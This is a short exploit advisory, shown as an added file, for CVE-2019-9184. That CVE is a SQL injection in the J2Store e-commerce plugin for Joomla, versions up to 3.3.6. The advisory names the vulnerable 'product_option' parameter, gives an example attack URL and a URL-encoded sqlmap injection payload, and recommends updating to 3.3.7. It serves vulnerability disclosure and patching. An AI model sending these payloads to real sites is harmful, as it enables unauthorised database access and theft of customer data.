@@ -1,0 +1,25 @@
+# Exploit Title: J2Store Plugin for Joomla! < 3.3.6 - SQL Injection
+# Date: 19/02/2019
+# Author: Andrei Conache
+# Twitter: @andrei_conache
+# Contact: andrei.conache[at]protonmail.com
+# Software Link: https://www.j2store.org
+# Version: 3.x-3.3.6
+# Tested on: Linux
+# CVE: CVE-2019-9184
+
+
+1. Description:
+J2Store is the most popular shopping/e-commerce extension for Joomla!. The SQL Injection found allows any visitor to run arbitrary queries
+on the website.
+ 
+
+2. Proof of Concept:
+
+- Parameter vulnerable: "product_option[j]" array (where j depends on entries)
+- Example: [URL]/index.php?option=com_j2store&view=product&task=update&product_option[j]=%27%22%3E2&product_qty=1&product_id=XX&option=com_j2store&ajax=0&_=XXXXXXXXXX
+- sqlmap: product_option[j]=%28CASE%20WHEN%20%284862%3D4862%29%20THEN%204862%20ELSE%204862%2A%28SELECT%204862%20FROM%20DUAL%20UNION%20SELECT%205348%20FROM%20DUAL%29%20END%29
+
+
+3. Solution:
+Update to 3.3.7
